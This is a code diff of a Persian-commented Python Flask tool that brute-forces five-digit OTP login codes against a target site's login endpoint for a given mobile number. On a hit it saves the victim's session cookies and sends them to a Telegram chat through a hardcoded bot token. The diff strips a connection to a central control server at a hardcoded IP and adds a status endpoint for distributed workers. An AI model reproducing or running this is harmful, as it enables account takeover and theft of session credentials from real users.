@@ -4,16 +4,11 @@ from http.cookiejar import MozillaCookieJar
 from concurrent.futures import ThreadPoolExecutor
 import time
 import sys
-from flask import Flask, render_template_string, request
+from flask import Flask, render_template_string, request, jsonify
 from flask_socketio import SocketIO, emit
 import threading
 import os
 from datetime import datetime
-import socketio
-
-# اتصال به سرور مرکزی
-sio = socketio.Client()
-sio.connect('http://104.251.216.12:5000')  # آدرس سرور مرکزی رو بذار
 
 # تنظیمات تلگرام
 TELEGRAM_BOT_TOKEN = "5858689331:AAH3pdfEDVSIF9AaPsWCGQiZzltgkKVtKr8"
@@ -22,10 +17,16 @@ TELEGRAM_CHAT_ID = "-1002021960039"
 app = Flask(__name__)
 socketio = SocketIO(app)
 
-# متغیرهای گلوبال برای کنترل پروسه
+# متغیرهای گلوبال برای کنترل پروسه و وضعیت
 running = False
 found_success = False
 progress_log = []
+current_status = {
+    "running": False,
+    "current_range": {"start": 0, "end": 0},
+    "processed": 0,
+    "error": None
+}
 
 def send_file_to_telegram(file_path, retries=3):
     """ارسال فایل به تلگرام با تلاش مجدد در صورت خطا"""
@@ -34,7 +35,6 @@ def send_file_to_telegram(file_path, retries=3):
         try:
             if not os.path.exists(file_path):
                 progress_log.append(f"Error: File {file_path} does not exist!")
-                socketio.emit('remote_log', {'log': progress_log[-1]})
                 return False
             with open(file_path, 'rb') as file:
                 files = {'document': file}
@@ -42,11 +42,9 @@ def send_file_to_telegram(file_path, retries=3):
                 response = requests.post(url, data=data, files=files, timeout=10)
                 response.raise_for_status()
                 progress_log.append(f"File {file_path} sent to Telegram successfully!")
-                socketio.emit('remote_log', {'log': progress_log[-1]})
                 return True
         except (requests.exceptions.RequestException, FileNotFoundError) as e:
             progress_log.append(f"Failed to send {file_path} to Telegram (attempt {attempt + 1}/{retries}): {str(e)}")
-            socketio.emit('remote_log', {'log': progress_log[-1]})
             if attempt < retries - 1:
                 time.sleep(2)
     return False
@@ -63,16 +61,14 @@ def save_and_send_cookies(cookies, code_str):
     
     if os.path.exists(cookies_file) and os.path.getsize(cookies_file) > 0:
         progress_log.append(f"Cookies saved in {cookies_file}")
-        socketio.emit('remote_log', {'log': progress_log[-1]})
         success = send_file_to_telegram(cookies_file)
         if not success:
             progress_log.append(f"Critical: Failed to send cookies {cookies_file} to Telegram after retries!")
-            socketio.emit('remote_log', {'log': progress_log[-1]})
     else:
         progress_log.append(f"Error: Failed to save cookies to {cookies_file}")
-        socketio.emit('remote_log', {'log': progress_log[-1]})
 
 def send_request(host, login_otp_nonce, mobile, code_values, counter, max_retries=5):
+    global current_status
     headers = {
         "Host": host,
         "Sec-Ch-Ua-Platform": "\"Windows\"",
@@ -118,7 +114,6 @@ def send_request(host, login_otp_nonce, mobile, code_values, counter, max_retrie
                            f"Message: {json_response['data']['message']}\n"
                            f"Redirect to: {json_response['data']['redirect']}")
                     progress_log.append(msg)
-                    socketio.emit('remote_log', {'log': progress_log[-1]})
                     save_and_send_cookies(response.cookies, code_str)
 
                     timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
@@ -126,20 +121,28 @@ def send_request(host, login_otp_nonce, mobile, code_values, counter, max_retrie
                     with open(output_file, 'w', encoding='utf-8') as f:
                         f.write(msg + f"\nCookies file: {cookies_file}\n")
                     progress_log.append(f"Output saved in {output_file}")
-                    socketio.emit('remote_log', {'log': progress_log[-1]})
                     send_file_to_telegram(output_file)
+                    current_status["error"] = "Success found!"
                     return True
                 else:
                     progress_log.append(f"Failed with code {code_str} (number {counter}): {json_response}")
-                    socketio.emit('remote_log', {'log': progress_log[-1]})
+                    current_status["processed"] = counter
                     return False
             except json.JSONDecodeError:
                 progress_log.append(f"Error parsing JSON for code {code_str} (number {counter})")
-                socketio.emit('remote_log', {'log': progress_log[-1]})
+                current_status["error"] = "JSON parsing error"
                 return False
         except requests.exceptions.RequestException as e:
-            progress_log.append(f"Network error with code {code_str} (attempt {attempt + 1}/{max_retries + 1}): {str(e)}")
-            socketio.emit('remote_log', {'log': progress_log[-1]})
+            error_msg = str(e)
+            if isinstance(e, requests.exceptions.HTTPError):
+                if e.response.status_code == 429:
+                    error_msg = "Rate Limit exceeded (429)"
+                elif e.response.status_code == 403:
+                    error_msg = "IP blocked by server (403)"
+                elif e.response.status_code == 503:
+                    error_msg = "Server unavailable (503)"
+            progress_log.append(f"Network error with code {code_str} (attempt {attempt + 1}/{max_retries + 1}): {error_msg}")
+            current_status["error"] = error_msg
             if attempt < max_retries:
                 time.sleep(2)
                 continue
@@ -150,9 +153,14 @@ def generate_code(counter):
     return [int(digit) for digit in code_str]
 
 def run_bruteforce(host, login_otp_nonce, mobile, connections, start_range, end_range):
-    global running, found_success
+    global running, found_success, current_status
     progress_log.append(f"Starting bruteforce from {start_range} to {end_range}...")
-    socketio.emit('remote_log', {'log': progress_log[-1]})
+    current_status = {
+        "running": True,
+        "current_range": {"start": start_range, "end": end_range},
+        "processed": start_range,
+        "error": None
+    }
     batch_size = connections
     found_success = False
 
@@ -162,7 +170,7 @@ def run_bruteforce(host, login_otp_nonce, mobile, connections, start_range, end_
                 progress_log.append("Stopping: Successful code found!")
             else:
                 progress_log.append("Process stopped manually!")
-                socketio.emit('remote_log', {'log': progress_log[-1]})
+            current_status["running"] = False
             break
 
         batch_end = min(batch_start + batch_size, end_range)
@@ -180,160 +188,19 @@ def run_bruteforce(host, login_otp_nonce, mobile, connections, start_range, end_
                         found_success = True
                         running = False
                         progress_log.append("Process stopped because a successful code was found!")
-                        socketio.emit('remote_log', {'log': progress_log[-1]})
-                        break  # از حلقه داخلی هم خارج می‌شیم
+                        current_status["running"] = False
+                        break
                 except Exception as e:
                     progress_log.append(f"Exception in future: {str(e)}")
-                    socketio.emit('remote_log', {'log': progress_log[-1]})
+                    current_status["error"] = str(e)
 
+        current_status["processed"] = batch_end
         if not found_success:
-            time.sleep(0.1)  # تأخیر خیلی کم برای سرعت بیشتر
+            time.sleep(0.1)
 
     if not found_success:
         progress_log.append(f"No successful code found in range {start_range:05d}-{end_range:05d}.")
-        socketio.emit('remote_log', {'log': progress_log[-1]})
-
-@app.route('/')
-def index():
-    return render_template_string('''
-    <!DOCTYPE html>
-    <html lang="fa">
-    <head>
-        <meta charset="UTF-8">
-        <title>بررسی کد OTP</title>
-        <script src="https://cdn.tailwindcss.com"></script>
-        <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.5.1/socket.io.js"></script>
-        <style>
-            body { direction: rtl; font-family: Arial, sans-serif; }
-            #progress { height: 300px; overflow-y: auto; }
-            .range-option { transition: all 0.2s; }
-            .range-option:hover { background-color: #e5e7eb; }
-        </style>
-    </head>
-    <body class="bg-gray-100 p-6">
-        <div class="max-w-2xl mx-auto bg-white p-6 rounded-lg shadow-lg">
-            <h1 class="text-2xl font-bold text-center mb-6">بررسی کد OTP</h1>
-            <form id="form" class="space-y-4">
-                <div>
-                    <label class="block text-sm font-medium text-gray-700">هاست:</label>
-                    <input type="text" id="host" class="mt-1 block w-full p-2 border rounded" value="hos.com">
-                </div>
-                <div>
-                    <label class="block text-sm font-medium text-gray-700">Nonce:</label>
-                    <input type="text" id="nonce" class="mt-1 block w-full p-2 border rounded" value="9d6178e07d">
-                </div>
-                <div>
-                    <label class="block text-sm font-medium text-gray-700">شماره موبایل:</label>
-                    <input type="text" id="mobile" class="mt-1 block w-full p-2 border rounded" value="0914">
-                </div>
-                <div>
-                    <label class="block text-sm font-medium text-gray-700">تعداد کانکشن‌ها:</label>
-                    <input type="number" id="connections" class="mt-1 block w-full p-2 border rounded" value="20">
-                </div>
-                <div>
-                    <label class="block text-sm font-medium text-gray-700 mb-2">محدوده شروع و پایان:</label>
-                    <div class="grid grid-cols-2 gap-2 max-h-40 overflow-y-auto p-2 border rounded">
-                        <label class="range-option p-2 rounded cursor-pointer">
-                            <input type="radio" name="range" value="0-10000" checked class="mr-2"> 00000 - 10000
-                        </label>
-                        <label class="range-option p-2 rounded cursor-pointer">
-                            <input type="radio" name="range" value="10000-20000" class="mr-2"> 10000 - 20000
-                        </label>
-                        <label class="range-option p-2 rounded cursor-pointer">
-                            <input type="radio" name="range" value="20000-30000" class="mr-2"> 20000 - 30000
-                        </label>
-                        <label class="range-option p-2 rounded cursor-pointer">
-                            <input type="radio" name="range" value="30000-40000" class="mr-2"> 30000 - 40000
-                        </label>
-                        <label class="range-option p-2 rounded cursor-pointer">
-                            <input type="radio" name="range" value="40000-50000" class="mr-2"> 40000 - 50000
-                        </label>
-                        <label class="range-option p-2 rounded cursor-pointer">
-                            <input type="radio" name="range" value="50000-60000" class="mr-2"> 50000 - 60000
-                        </label>
-                        <label class="range-option p-2 rounded cursor-pointer">
-                            <input type="radio" name="range" value="60000-70000" class="mr-2"> 60000 - 70000
-                        </label>
-                        <label class="range-option p-2 rounded cursor-pointer">
-                            <input type="radio" name="range" value="70000-80000" class="mr-2"> 70000 - 80000
-                        </label>
-                        <label class="range-option p-2 rounded cursor-pointer">
-                            <input type="radio" name="range" value="80000-90000" class="mr-2"> 80000 - 90000
-                        </label>
-                        <label class="range-option p-2 rounded cursor-pointer">
-                            <input type="radio" name="range" value="90000-99999" class="mr-2"> 90000 - 99999
-                        </label>
-                    </div>
-                </div>
-                <div class="flex space-x-4">
-                    <button type="button" id="start" class="w-full bg-green-500 text-white p-2 rounded hover:bg-green-600">شروع</button>
-                    <button type="button" id="stop" class="w-full bg-red-500 text-white p-2 rounded hover:bg-red-600" disabled>توقف</button>
-                </div>
-            </form>
-            <div class="mt-6">
-                <h2 class="text-lg font-semibold">پیشرفت:</h2>
-                <div id="progress" class="bg-gray-50 p-4 rounded border text-sm"></div>
-            </div>
-        </div>
-
-        <script>
-            const socket = io();
-            const form = document.getElementById('form');
-            const startBtn = document.getElementById('start');
-            const stopBtn = document.getElementById('stop');
-            const progressDiv = document.getElementById('progress');
-            const maxLogs = 20;
-
-            socket.on('connect', () => {
-                console.log('Connected to WebSocket');
-            });
-
-            socket.on('update_progress', function(data) {
-                console.log('Received update:', data);
-                const log = document.createElement('p');
-                log.textContent = data.log;
-                progressDiv.appendChild(log);
-                while (progressDiv.children.length > maxLogs) {
-                    progressDiv.removeChild(progressDiv.firstChild);
-                }
-                progressDiv.scrollTop = progressDiv.scrollHeight;
-            });
-
-            startBtn.addEventListener('click', () => {
-                const host = document.getElementById('host').value;
-                const nonce = document.getElementById('nonce').value;
-                const mobile = document.getElementById('mobile').value;
-                const connections = document.getElementById('connections').value;
-                const range = document.querySelector('input[name="range"]:checked').value.split('-');
-                const startRange = parseInt(range[0]);
-                const endRange = parseInt(range[1]);
-
-                fetch('/start', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ host, nonce, mobile, connections, startRange, endRange })
-                }).then(response => {
-                    if (response.ok) {
-                        startBtn.disabled = true;
-                        stopBtn.disabled = false;
-                    } else {
-                        console.error('Start failed:', response.status);
-                    }
-                }).catch(error => console.error('Fetch error:', error));
-            });
-
-            stopBtn.addEventListener('click', () => {
-                fetch('/stop', {
-                    method: 'POST'
-                }).then(() => {
-                    startBtn.disabled = false;
-                    stopBtn.disabled = true;
-                });
-            });
-        </script>
-    </body>
-    </html>
-    ''')
+        current_status["running"] = False
 
 @app.route('/start', methods=['POST'])
 def start():
@@ -347,10 +214,9 @@ def start():
     end_range = int(data['endRange'])
 
     running = True
-    found_success = False  # ریست کردن برای استارت جدید
+    found_success = False
     progress_log = []
     progress_log.append("Start button clicked!")
-    socketio.emit('remote_log', {'log': progress_log[-1]})
     threading.Thread(target=run_bruteforce, args=(host, login_otp_nonce, mobile, connections, start_range, end_range)).start()
     return '', 204
 
@@ -359,8 +225,12 @@ def stop():
     global running
     running = False
     progress_log.append("Stop button clicked!")
-    socketio.emit('remote_log', {'log': progress_log[-1]})
     return '', 204
+
+@app.route('/status', methods=['GET'])
+def status():
+    """برگشت وضعیت فعلی ورکر"""
+    return jsonify(current_status)
 
 if __name__ == '__main__':
     socketio.run(app, host='0.0.0.0', port=5000, debug=True)
